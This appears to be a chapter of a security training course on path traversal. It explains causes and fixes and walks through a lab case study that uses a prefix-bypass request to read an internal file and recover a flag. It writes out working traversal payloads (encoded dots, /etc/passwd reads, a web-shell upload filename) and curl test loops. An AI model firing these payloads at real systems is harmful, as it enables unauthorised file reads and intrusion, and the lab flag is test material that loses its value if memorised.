# 03 — Paths and files: traversal as a containment bug

## 1. What this class of bug is

A helper takes a value from the request, joins it to a directory, and opens the result.
`view=public/DL-204.json` becomes `/srv/desk/public/DL-204.json`, which is what the customer
is meant to see. `view=public/../internal/DL-204.json` becomes
`/srv/desk/internal/DL-204.json`, which is not. Nothing was parsed incorrectly; the file
system did exactly what it was told.

Precise definition: **path traversal** (directory traversal, and in archive form *zip-slip /
tar-slip*) is a **containment failure**: a program accepts a path-shaped input, resolves it
against an intended root, and fails to verify that the *resolved* path is still inside that
root. The string `..` is only the most famous way to leave. Symlinks, absolute paths,
doubled separators, over-long UTF-8 encodings and nested archives all leave too. The property
to test is not "does the input contain dots" but "where does the final file live".

## 2. Why it exists

The developer's assumption, almost always stated in the code review: **"the string keeps it
inside the directory."** It does not. `os.path.join(PUBLIC, "public/../internal/x.json")`
is a legal string naming a file above `PUBLIC`; `Path(PUBLIC) / view` is the same. The
language is not a sandbox. Name the four concrete forms of the mistake:

- **Concatenation is not containment.** `open(BASE + view)` contains nothing. `os.path.join`
  is not a security function either — if the second argument is absolute it *replaces* the
  base, and `..` always walks up.
- **"Reject `..`" is a shape filter.** It validates the spelling of the input, not the
  meaning of the resolved path. It loses to `%2e%2e`, `..%2f`, `%252e%252e` (double decode),
  `....//` (strip-once filters), backslashes on Windows, and a symlink that has no dots at
  all.
- **"It starts with `public/`, so it is public."** The prefix check happens on the raw
  string, before resolution. `public/../internal/x` satisfies the prefix and escapes. This
  is the exact check that failed in this range's T01.4.
- **"The filename is just a name."** File parameters are frequently also used as ids
  (`?file=invoice-204.pdf`), so the developer thinks in names, while the runtime thinks in
  paths. Any parameter that resolves to a file is a path whether or not it looks like one.

There is a fifth assumption in the archive variant: **"the archive's member names are
metadata, not instructions."** An extractor that writes each declared member name honours
`../../other-object/file` and absolute paths; a manifest that declares its own object
identity is trusted to be *that* object. That is the same containment bug with a tarball as
the transport.

## 3. How to spot it

- Parameter names that smell like files: `view`, `file`, `path`, `filename`, `template`,
  `page`, `doc`, `attachment`, `download`, `theme`, `lang`, `export`, `log`.
- Values that contain a separator (`public/DL-204.json`, `invoices/204.pdf`). A two-part
  value is a directory plus a name, so a join is happening; ask what happens at the boundary.
- **A `400`/`403` that fires only when your value starts with `..`.** That is a filter, and a
  filter is an invitation to find the spelling it does not model. Keep the failing request:
  it tells you the check's position (prefix? substring? post-decode?).
- Error text that leaks the layout: absolute paths in stack traces, "no such file
  /srv/.../public/x", `Content-Disposition: attachment; filename=...`, directory listings.
- A public sibling of a sensitive directory. Layout *is* the vulnerability: `public/` and
  `internal/` side by side gives the traversal somewhere to land. A single flat directory
  makes the same code harmless.
- Endpoints described as "render", "preview", "export", "download", "diagnostics",
  "include", "template". Helpers are the usual suspect because they were written to be
  convenient, not to be a security boundary.
- Upload/extract surfaces: bundle, archive, zip, tar, backup, restore, import. Read the
  manifest schema — whichever paths it lets the archive declare are paths the extractor may
  honour.

## 4. How to test it

Recon first, then a controlled sequence. Stay read-only: a traversal that *reads* a file you
were not meant to see is the proof; a traversal that writes is a different, more dangerous
test you should not run outside a lab.

```bash
B=http://target:8083
curl -sS -o /tmp/base -w 'base %{http_code} %{size_download}\n' \
  -G --data-urlencode 'delivery_id=DL-204' \
     --data-urlencode 'view=public/DL-204.json' "$B/api/diagnostics/render"
```

The baseline establishes three facts: the helper needs no authentication, `view` has the
shape `directory/filename`, and a normal value renders. Now vary only `view`, and record
status plus length:

```bash
for v in 'internal/DL-204.json' '../internal/DL-204.json' 'public/../internal/DL-204.json' \
         '..%2finternal%2fDL-204.json' 'public/%2e%2e/internal/DL-204.json' \
         './public/../../internal/DL-204.json'; do
  printf '%-42s ' "$v"
  curl -sS -o /tmp/o -w '%{http_code} %{size_download}\n' -G \
    --data-urlencode 'delivery_id=DL-204' --data-urlencode "view=$v" \
    "$B/api/diagnostics/render"
done
```

Read the results as a map of the check, not as a scoreboard:

| Result | What it tells you |
|---|---|
| `200`, body differs from baseline | the read happened outside the intended file — finding |
| `404` | the join occurred but no such file; you learned the layout, adjust the depth |
| `400` / `403` | a filter fired; note *which* variant it fired on — that is its grammar |
| `500` | the join happened and something downstream broke; suspicious, not proof |
| `200`, body equals baseline | the parameter was ignored, or a catch-all served the same page |

The order matters. Send the plain sibling first (`internal/...`): a `404` means the helper
prepends `public/` itself; a `200` means it does not. Then send the prefixed traversal
(`public/../internal/...`): if the first was rejected for a bad prefix and this one passes,
the filter is a **prefix** check and you have just satisfied it while still escaping. Then
send encodings (`%2e%2e`, `..%2f`, `%252e`) to test whether decoding happens before or after
the check. Each response eliminates one hypothesis.

For absolute paths and depth, two more single requests:

```bash
B=http://target:8083
curl -sS -G --data-urlencode 'view=/etc/passwd' "$B/api/diagnostics/render"   # does join() replace the base?
curl -sS -G --data-urlencode 'view=public/../../../../etc/passwd' "$B/api/diagnostics/render"
```

If the resolved file is outside the root but the response is just an error, you have found
the class but not an exploitable read — say so honestly rather than calling it a breach.

Safe practice: use one delivery/job id you legitimately own, never a write method, and do not
traverse into other tenants' directories. Once you can read one file you should not, stop.

## 5. Case study from this range

### T01.4 — the helper has another job

The workbench publishes a diagnostics helper that renders a delivery view:

```bash
curl -sS 'http://workbench.training:8083/api/diagnostics/render?delivery_id=DL-204&view=public/DL-204.json'
```

`view` is a `directory/filename` pair, so the server is joining strings. The internal record
for the same delivery is a **sibling** of `public/`, which is the layout condition that makes
the bug exploitable. The first attempt is the obvious one:

```bash
curl -sS -G --data-urlencode 'delivery_id=DL-204' \
     --data-urlencode 'view=../internal/DL-204.json' \
     'http://workbench.training:8083/api/diagnostics/render'
# 400 invalid_request
```

**This `400` is the most instructive response in the chapter.** The helper prepends `public/`
itself, so the value it wants is relative to that root — and it rejects a value that starts
with `..`. The filter is checking the *prefix of the string*, not the resolved path. So give
it a legitimate prefix and let the dots come after it:

```bash
curl -sS -G --data-urlencode 'delivery_id=DL-204' \
     --data-urlencode 'view=public/../internal/DL-204.json' \
     'http://workbench.training:8083/api/diagnostics/render'
```

The helper joins `public/` + `public/../internal/DL-204.json`; the first `public/` and the
following `..` cancel, and the read lands on `internal/DL-204.json` — the record whose fields
the public view redacts. The flag came back in that body: `FLAG{3bf1d8651d39b64c}`.

Three lessons, in order of transfer value:

1. The `400` did not mean "secure"; it meant "wrong spelling". A filter that rejects `../`
   at the start of the value is protecting a *shape*. Read the rejection as a specification.
2. `public/../internal/...` is a legal relative path *and* a legal prefix match. Any check
   performed before canonicalisation can be satisfied and then walked out of.
3. The fix is not a better blacklist; it is comparing the resolved path to the root after
   resolution. [`../writeups/T01.4.md`](../writeups/T01.4.md)

The write-up records only `public/../` as successful among the variants it swept, and the
captured body was not preserved — the request and the file it resolved to are the evidence.
Start-here's walkthrough of the same desk notes the identical `400 invalid_request` on the
direct `../` form.

### K04.1 — the same bug with a tarball as transport

In the KeplerOps estate, the support indexer accepted uploaded bundles and extracted members
by their declared names. A member called `../../<other-object>/<file>` writes outside the
uploaded object's area; a symlink member pointing at another object's directory does the same
without a single `..` in the file being written; and a manifest that declares another object's
id gets the indexer to update *that* object. Archive extraction is path traversal where the
attacker controls the path list in bulk. That write-up is reconstructed from the objective,
not a captured session: [`../writeups/K04.1.md`](../writeups/K04.1.md).

## 6. Variations and near misses

- **Encoded and double-encoded dots.** `%2e%2e%2f`, `..%2f`, `%252e%252e%252f`. Whether they
  work tells you the decode order: decode-then-check blocks them; check-then-decode does not.
- **Strip-once filters.** A filter that deletes `../` turns `....//` into `../`. Test the
  transform, not the token: `....//....//internal/x`.
- **Absolute paths.** `view=/etc/passwd` tests whether the join replaces the base. It is a
  different bug from `..` (same containment failure, different primitive).
- **Symlinks.** A link inside the allowed root that points outside contains no `..` at all.
  String checks pass; resolution escapes. Only `realpath` + prefix comparison, or `O_NOFOLLOW`
  / `openat2(RESOLVE_BENEATH)`, catches it.
- **Backslashes on Windows.** `..\..\internal\x` — a filter written for `/` misses it, and
  `ntpath.join` behaves differently from `posixpath.join`.
- **Filename parameters on upload.** `filename="../../webroot/shell.php"` is traversal with a
  write primitive; the containment rule is the same.
- **Not a bug: `404`.** If the resolved path does not exist, you have not read anything. A
  `404` on `../internal/x` may simply mean `internal/` is not there.
- **Not a bug: `403` after canonicalisation.** A service that resolves and compares, then
  denies, is working. The presence of `..` in a log line is not a finding.
- **Not a bug: dots in a name.** `report..final.json`, `a..b`, `...` resolve inside the root.
  Judge the resolved path, never the substring.
- **Not a bug: a path used only for display.** A parameter echoed into HTML is XSS territory;
  it is traversal only if it reaches a filesystem call.

## 7. How to fix it

- **Do not accept paths; accept ids.** Allowlist view/file identifiers (`dl-204-public`) and
  map them to filenames server-side, so no caller-controlled string reaches the filesystem.
  This is the only fix that removes the class rather than the symptom.
- When a path is unavoidable, **canonicalise then compare**, including symlinks:

```python
root = os.path.realpath(PUBLIC_ROOT)
target = os.path.realpath(os.path.join(root, request.args["view"]))
if os.path.commonpath([root, target]) != root:
    abort(403)
```

- **Open with no-follow semantics**: `O_NOFOLLOW` for the final component, or
  `openat2(..., RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS)` on Linux. `realpath`-then-open has a
  race (TOCTOU); `openat2` does the check and the open in one syscall.
- **Reject absolute paths explicitly** and decode exactly once, before the check, never after.
  Prefer resolving with the same library that will open the file.
- **For archives:** extract with member-name validation (normalise, reject `..`, absolute
  paths and links), or better, extract to a fresh directory and refuse symlinks/hardlinks
  entirely. Do not trust a manifest's object identity; authorize the declared object against
  the uploader.
- **Log the resolved path**, not the raw parameter — otherwise `public/DL-204.json` and
  `public/../internal/DL-204.json` look identical in your logs, and you cannot alert on
  `resolved_path` outside `PUBLIC_ROOT`.

## 8. Exercises

1. **Reproduce the prefix bypass, then fix it.** A 25-line Flask app with
   `PUBLIC=/tmp/desk/public`, `INTERNAL=/tmp/desk/internal`, a `view` parameter and this
   check: `if not view.startswith("public/"): abort(400)`. Show that
   `public/../internal/secret.json` reads the secret. Then replace the check with the
   `realpath` + `commonpath` version and show the same request is `403`.
2. **Break your own fix.** Add a symlink inside `public/` pointing at
   `../internal/secret.json` and request it by its innocent name. Explain which line of the
   fix catches it and which would not (e.g. why a `..` substring filter is useless here).
3. **Predict six responses.** Given a helper that prepends `public/` and rejects values whose
   raw string starts with `..`, predict `200`/`400`/`403`/`404` for: `public/DL-204.json`,
   `internal/DL-204.json`, `../internal/DL-204.json`, `public/../internal/DL-204.json`,
   `public/%2e%2e/internal/DL-204.json`, and `./public/DL-204.json`. Then run them against
   your lab app and reconcile every wrong prediction.
